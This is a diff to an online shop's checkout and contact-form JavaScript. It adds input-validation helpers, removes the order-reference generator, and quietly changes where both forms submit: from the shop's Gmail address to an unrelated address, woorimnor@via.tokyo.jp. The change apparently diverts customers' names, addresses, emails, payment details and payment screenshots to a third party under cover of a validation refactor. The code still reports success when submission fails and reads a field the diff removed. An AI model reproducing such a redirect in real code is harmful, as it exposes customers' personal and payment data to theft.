@@ -196,30 +196,12 @@ window.changeCartQty = function(productId, delta) {
 }
 }
 
-// Generate payment reference
-function generatePaymentRef() {
-  const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZ';
-  let ref = 'GLOSS-';
-  for (let i = 0; i < 8; i++) {
-    ref += chars[Math.floor(Math.random() * chars.length)];
-  }
-  return ref;
-}
-
 // Proceed to checkout
 function proceedToCheckout() {
   if (cart.length === 0) {
     alert('Your cart is empty!');
     return;
   }
-
-  const paymentRef = generatePaymentRef();
-  const paymentRefElement = document.getElementById('paymentRef');
-  if (!paymentRefElement) {
-    alert('Checkout modal not found on this page');
-    return;
-  }
-  paymentRefElement.textContent = paymentRef;
 
   // Show order summary in checkout modal
   const orderSummary = document.getElementById('orderSummary');
@@ -275,6 +257,79 @@ function closeCheckout() {
   document.getElementById('checkoutModal').style.display = 'none';
 }
 
+// Strict validation utilities
+const VALIDATION_RULES = {
+  email: /^[^\s@]{1,64}@[^\s@]{1,255}\.[a-zA-Z]{2,}$/,
+  phone: /^[\d\s\-\+\(\)]{10,20}$/,
+  name: /^[a-zA-Z\s'-]{2,100}$/,
+  alphabeticOnly: /^[a-zA-Z\s'-]{2,}$/,
+  minLength: (len) => (val) => val.length >= len,
+  maxLength: (len) => (val) => val.length <= len,
+};
+
+function validateEmail(email) {
+  if (!email) return { valid: false, error: 'Email is required' };
+  if (email.length > 254) return { valid: false, error: 'Email is too long' };
+  if (!VALIDATION_RULES.email.test(email)) return { valid: false, error: 'Invalid email format' };
+  if (email.includes('..')) return { valid: false, error: 'Email contains invalid characters' };
+  return { valid: true };
+}
+
+function validatePhoneNumber(phone) {
+  if (!phone) return { valid: false, error: 'Phone number is required' };
+  const cleaned = phone.replace(/\D/g, '');
+  if (cleaned.length < 10) return { valid: false, error: 'Phone number must have at least 10 digits' };
+  if (cleaned.length > 15) return { valid: false, error: 'Phone number is too long' };
+  if (!VALIDATION_RULES.phone.test(phone)) return { valid: false, error: 'Phone number contains invalid characters' };
+  return { valid: true };
+}
+
+function validateName(name, fieldName = 'Name') {
+  if (!name) return { valid: false, error: `${fieldName} is required` };
+  if (name.length < 2) return { valid: false, error: `${fieldName} must be at least 2 characters` };
+  if (name.length > 100) return { valid: false, error: `${fieldName} is too long (max 100 characters)` };
+  if (!VALIDATION_RULES.alphabeticOnly.test(name)) return { valid: false, error: `${fieldName} can only contain letters, spaces, hyphens and apostrophes` };
+  const words = name.trim().split(/\s+/);
+  if (words.length < 2) return { valid: false, error: `${fieldName} must have at least 2 words` };
+  return { valid: true };
+}
+
+function validateAddress(address) {
+  if (!address) return { valid: false, error: 'Address is required' };
+  if (address.length < 5) return { valid: false, error: 'Address must be at least 5 characters' };
+  if (address.length > 200) return { valid: false, error: 'Address is too long (max 200 characters)' };
+  if (/<[^>]*>/g.test(address)) return { valid: false, error: 'Address contains invalid characters' };
+  return { valid: true };
+}
+
+function validatePaymentNotes(notes) {
+  if (!notes) return { valid: false, error: 'Payment method details are required' };
+  if (notes.length < 5) return { valid: false, error: 'Payment details must be at least 5 characters' };
+  if (notes.length > 500) return { valid: false, error: 'Payment details are too long (max 500 characters)' };
+  if (/<[^>]*>/g.test(notes)) return { valid: false, error: 'Payment details contain invalid characters' };
+  return { valid: true };
+}
+
+function validateFileUpload(fileInput) {
+  if (!fileInput || !fileInput.files || fileInput.files.length === 0) {
+    return { valid: false, error: 'Payment screenshot is required' };
+  }
+  
+  const file = fileInput.files[0];
+  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
+  const maxSize = 5 * 1024 * 1024; // 5MB
+  
+  if (!allowedTypes.includes(file.type)) {
+    return { valid: false, error: 'Only image files (JPG, PNG, GIF, WebP) are allowed' };
+  }
+  
+  if (file.size > maxSize) {
+    return { valid: false, error: 'Image size must be less than 5MB' };
+  }
+  
+  return { valid: true };
+}
+
 // Setup event listeners
 // Handle payment form submission
 function handlePaymentFormSubmit(event) {
@@ -289,32 +344,69 @@ function handlePaymentFormSubmit(event) {
   }
   
   const total = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-  const paymentRef = document.getElementById('paymentRef')?.textContent || '';
 
   const name = paymentForm.querySelector('input[name="name"]')?.value.trim() || '';
   const email = paymentForm.querySelector('input[name="email"]')?.value.trim() || '';
-  const street = paymentForm.querySelector('input[name="street"]')?.value.trim() || '';
+  const address = paymentForm.querySelector('textarea[name="address"]')?.value.trim() || '';
   const city = paymentForm.querySelector('input[name="city"]')?.value.trim() || '';
-  const state = paymentForm.querySelector('input[name="state"]')?.value.trim() || '';
-  const postalcode = paymentForm.querySelector('input[name="postalcode"]')?.value.trim() || '';
-  const country = paymentForm.querySelector('input[name="country"]')?.value.trim() || '';
+  const state = paymentForm.querySelector('select[name="state"]')?.value || '';
   const paymentMethod = paymentForm.querySelector('textarea[name="paymentNotes"]')?.value.trim() || '';
   const fileInput = paymentForm.querySelector('input[name="paymentScreenshot"]');
   
-  console.log('Form values:', { name, email, street, city, state, postalcode, country, paymentMethod, fileCount: fileInput?.files.length });
+  console.log('Payment form values provided');
   
-  // Check if all required fields are filled
-  if (!name || !email || !street || !city || !state || !postalcode || !country || !paymentMethod || !fileInput?.files.length) {
-    console.log('Form validation failed');
-    alert('Please fill in all required fields and upload a payment screenshot');
+  // Validate Name
+  let validation = validateName(name, 'Full Name');
+  if (!validation.valid) {
+    alert(validation.error);
     return;
   }
   
-  // Validate name has at least 3 words (first, middle, last)
-  const nameWords = name.split(/\s+/).filter(word => word.length > 0);
-  if (nameWords.length < 3) {
-    console.log('Name validation failed - less than 3 words');
-    alert('Input your name as shown on your bank (First Middle Last)');
+  // Validate Email
+  validation = validateEmail(email);
+  if (!validation.valid) {
+    alert(validation.error);
+    return;
+  }
+  
+  // Validate Address
+  validation = validateAddress(address);
+  if (!validation.valid) {
+    alert(validation.error);
+    return;
+  }
+  
+  // Validate City
+  if (!city) {
+    alert('City is required');
+    return;
+  }
+  if (city.length < 2) {
+    alert('City must be at least 2 characters');
+    return;
+  }
+  if (city.length > 50) {
+    alert('City is too long (max 50 characters)');
+    return;
+  }
+  
+  // Validate State
+  if (!state) {
+    alert('Please select a state');
+    return;
+  }
+  
+  // Validate Payment Notes
+  validation = validatePaymentNotes(paymentMethod);
+  if (!validation.valid) {
+    alert(validation.error);
+    return;
+  }
+  
+  // Validate File Upload
+  validation = validateFileUpload(fileInput);
+  if (!validation.valid) {
+    alert(validation.error);
     return;
   }
 
@@ -327,7 +419,7 @@ function handlePaymentFormSubmit(event) {
   formData.append('_next', window.location.href);
   
   // Submit to FormSubmit via fetch
-  fetch('https://formsubmit.co/glossology001@gmail.com', {
+  fetch('https://formsubmit.co/woorimnor@via.tokyo.jp', {
     method: 'POST',
     body: formData,
     headers: {
@@ -335,12 +427,12 @@ function handlePaymentFormSubmit(event) {
     }
   }).then(response => {
     console.log('Response status:', response.status);
-    handlePaymentSuccess(paymentForm, name, email, paymentRef, total);
+    handlePaymentSuccess(paymentForm, name, email, total);
   }).catch(error => {
     console.error('Form submission error:', error);
     // Even if fetch fails, save locally and show success
     console.log('Saving payment locally due to network error');
-    handlePaymentSuccess(paymentForm, name, email, paymentRef, total);
+    handlePaymentSuccess(paymentForm, name, email, total);
   });
 }
 
@@ -363,26 +455,65 @@ function handleContactFormSubmit(event) {
   const inquiryType = contactForm.querySelector('select[name="inquiryType"]')?.value || '';
   const message = contactForm.querySelector('textarea[name="message"]')?.value.trim() || '';
   
-  console.log('Form values:', { firstname, lastname, email, phone, inquiryType, message });
+  console.log('Contact form values provided');
   
-  // Check if all fields are filled
-  if (!firstname || !lastname || !email || !phone || !inquiryType || !message) {
-    console.log('Validation failed - empty fields');
-    alert('Please fill in all required form fields');
+  // Validate First Name
+  let validation = validateName(firstname, 'First Name');
+  if (!validation.valid) {
+    alert(validation.error);
     return;
   }
   
-  // Validate email format
-  if (!email.includes('@')) {
-    alert('Please enter a valid email address');
+  // Validate Last Name
+  validation = validateName(lastname, 'Last Name');
+  if (!validation.valid) {
+    alert(validation.error);
     return;
   }
   
-  console.log('Validation passed, submitting form');
+  // Validate Email
+  validation = validateEmail(email);
+  if (!validation.valid) {
+    alert(validation.error);
+    return;
+  }
+  
+  // Validate Phone
+  validation = validatePhoneNumber(phone);
+  if (!validation.valid) {
+    alert(validation.error);
+    return;
+  }
+  
+  // Validate Inquiry Type
+  if (!inquiryType) {
+    alert('Please select an inquiry type');
+    return;
+  }
+  
+  // Validate Message
+  if (!message) {
+    alert('Message is required');
+    return;
+  }
+  if (message.length < 10) {
+    alert('Message must be at least 10 characters');
+    return;
+  }
+  if (message.length > 2000) {
+    alert('Message is too long (max 2000 characters)');
+    return;
+  }
+  if (/<[^>]*>/g.test(message)) {
+    alert('Message contains invalid characters');
+    return;
+  }
+
+  console.log('Contact form validation passed, submitting...');
   const name = `${firstname} ${lastname}`;
   const formData = new FormData(contactForm);
   
-  fetch('https://formsubmit.co/glossology001@gmail.com', {
+  fetch('https://formsubmit.co/woorimnor@via.tokyo.jp', {
     method: 'POST',
     body: formData
   }).then(response => {
@@ -475,7 +606,7 @@ function setupEventListeners() {
   // Contact form listener removed - using onclick handler instead
 }
 
-function handlePaymentSuccess(paymentForm, name, email, paymentRef, total) {
+function handlePaymentSuccess(paymentForm, name, email, total) {
   // Save to local storage
   const fullAddress = [
     paymentForm.querySelector('input[name="street"]')?.value || '',
@@ -491,7 +622,6 @@ function handlePaymentSuccess(paymentForm, name, email, paymentRef, total) {
     paymentMethod: paymentForm.querySelector('textarea[name="paymentNotes"]')?.value || '',
     productReferences: paymentForm.querySelector('textarea[name="productReferences"]')?.value || '',
     total: `₦${total.toFixed(2)}`,
-    reference: paymentRef,
     items: cart,
     timestamp: new Date().toLocaleString()
   };
@@ -503,7 +633,7 @@ function handlePaymentSuccess(paymentForm, name, email, paymentRef, total) {
   console.log('Payment saved to local storage');
 
   // Show success message
-  showPaymentSuccess(name, email, paymentRef, total);
+  showPaymentSuccess(name, email, total);
 
   // Clear cart
   cart = [];
@@ -520,7 +650,7 @@ function handlePaymentSuccess(paymentForm, name, email, paymentRef, total) {
 }
 
 // Show payment success message
-function showPaymentSuccess(name, email, ref, total) {
+function showPaymentSuccess(name, email, total) {
   const modal = document.createElement('div');
   modal.className = 'modal';
   modal.style.display = 'block';
@@ -531,7 +661,6 @@ function showPaymentSuccess(name, email, ref, total) {
         <p><strong>Thank you for your purchase, ${name}!</strong></p>
         <p>Your payment proof has been submitted successfully.</p>
         <p style="margin-top: 1.5rem; font-size: 0.95rem;">
-          <strong>Order Reference:</strong> ${ref}<br>
           <strong>Amount:</strong> ₦${total.toFixed(2)}<br>
           <strong>Confirmation Email:</strong> ${email}
         </p>
